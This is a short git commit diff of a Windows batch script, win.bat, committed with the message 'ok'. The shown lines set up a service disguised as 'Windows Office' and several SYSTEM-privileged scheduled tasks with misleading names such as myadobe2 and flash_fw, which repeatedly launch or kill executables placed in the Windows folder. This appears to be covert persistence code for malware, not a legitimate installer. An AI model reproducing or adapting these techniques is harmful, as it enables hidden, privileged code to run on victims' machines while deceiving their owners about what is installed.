cc8ad2ae436e3e445c4078dccff1523330bba4e4
pistacchietto <pistacchietto2@gmail.com>
2019-02-20 23:32:12 +0100

    ok

--- win.bat
+++ win.bat
@@ -84,7 +84,7 @@ sc create wup1 binPath= "%windir%\wup1.exe" DisplayName= "Windows Office" start=
 net start wup1
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice2.exe" /tn myadobe2 /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
-schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
+schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice2.exe" /tn myflash /rl highest /F
 schtasks /create /tn sys /xml %windir%\sys.xml /F
 schtasks /create /tn syskill /xml %windir%\syskill.xml /F
 sc delete initsw
